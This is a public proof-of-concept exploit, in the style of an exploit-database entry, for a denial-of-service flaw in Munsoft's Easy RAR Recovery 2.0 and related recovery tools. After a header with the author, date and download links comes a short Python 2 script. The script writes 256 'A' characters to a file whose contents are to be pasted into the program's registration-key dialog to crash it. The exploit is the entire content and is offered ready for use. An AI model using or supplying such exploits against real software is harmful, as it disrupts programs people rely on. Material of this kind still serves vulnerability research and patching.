# Exploit Title: Mumsoft Easy Software 2.0 - Denial of Service (PoC)
# Dork: N/A
# Date: 2018-11-15
# Exploit Author: Ihsan Sencan
# Vendor Homepage: https://www.munsoft.com/EasyRARRecovery/
# Software Link: https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyRARRecovery/download/EasyRARRecovery-2.0-Setup.exe
# Other Affected software:
# Easy Archive Recovery 2.0
# https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyArchiveRecovery/download/EasyArchiveRecovery-2.0-Setup.exe
# Easy ZIP Recovery 2.0
# https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyZIPRecovery/download/EasyZIPRecovery-2.0-Setup.exe
# Easy Access Recovery 2.0
# https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyAccessRecovery/download/EasyAccessRecovery-2.0-Setup.exe
# Easy PowerPoint Recovery 2.0
# https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyPowerPointRecovery/download/EasyPowerPointRecovery-2.0-Setup.exe
# Easy Excel Recovery 2.0
# https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyExcelRecovery/download/EasyExcelRecovery-2.0-Setup.exe
# Easy Word Recovery 2.0
# https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyWordRecovery/download/EasyWordRecovery-2.0-Setup.exe

# Version: 2.0
# Category: Dos
# Tested on: WiN7_x64/KaLiLinuX_x64
# CVE: N/A

# POC: 
# 1)
# Help / Enter a registration key...

#!/usr/bin/python
    
buffer = "A" * 256
 
payload = buffer
try:
    f=open("exp.txt","w")
    print "[+] Creating %s bytes evil payload." %len(payload)
    f.write(payload)
    f.close()
    print "[+] File created!"
except:
    print "File cannot be created."